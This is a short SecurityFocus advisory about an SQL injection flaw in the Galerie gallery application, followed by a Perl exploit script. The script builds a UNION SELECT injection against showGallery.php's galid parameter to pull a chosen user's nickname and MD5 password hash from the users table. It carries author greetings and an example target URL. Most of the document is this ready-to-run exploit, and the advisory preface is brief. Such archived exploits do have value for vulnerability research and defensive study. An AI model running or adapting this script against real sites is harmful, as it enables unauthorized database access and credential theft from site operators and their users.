source: http://www.securityfocus.com/bid/15313/info

Galerie is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.

Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. 

#!/bin/env perl
#------------------------------------------------------------#
#-      Warning :- (ABDUCTER) Behind U BY (ABDUCTER_MINDS@S4A.CC) OR (ABDUCTER_MINDS@YAHOO.COM)
#-      [!]     ==|| Gallery_v2.4 SQL Injection ||==
#-              Gr33tz :-
#-                      N0N0 (MY LOVE)
#-                      WWW.S4A.CC
#-                      Devil-00
#-                      FOR ALL ARABIAN COUNTRIES
#------------------------------------------------------------#
use LWP::Simple;

print "\n\n==========================================\n";
print "\n= Exploit for Gallery_v2.4                    ";
print "\n=   BY    |(ABDUCTER_MINDS[at]YAHOO.COM)|     ";
print "\n=             FOR ALL ARAB WWW.S4A.CC         ";
print "\n============================================\n\n";

if(!$ARGV[0] or !$ARGV[1]) {
  print "\n==|| Warning ABDUCTER Behind U ||==";
  print "\nUsage:\nperl $0 [host+script]\n\nExample:\nperl $0 http://tonioc.free.fr/gallery/ 1\n";
  exit(0);
}
$url = "/showGallery.php?galid=-1%20UNION%20SELECT%20id,null,null,passw,null,nick,null,null,null,null,nick,null%20FROM%20users%20WHERE%20id=$ARGV[1]/*";
$page = get($ARGV[0].$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
$page =~ m/<SPAN class="strong"><b>(.*?)<\/b>/ && print "[+] MD5 hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);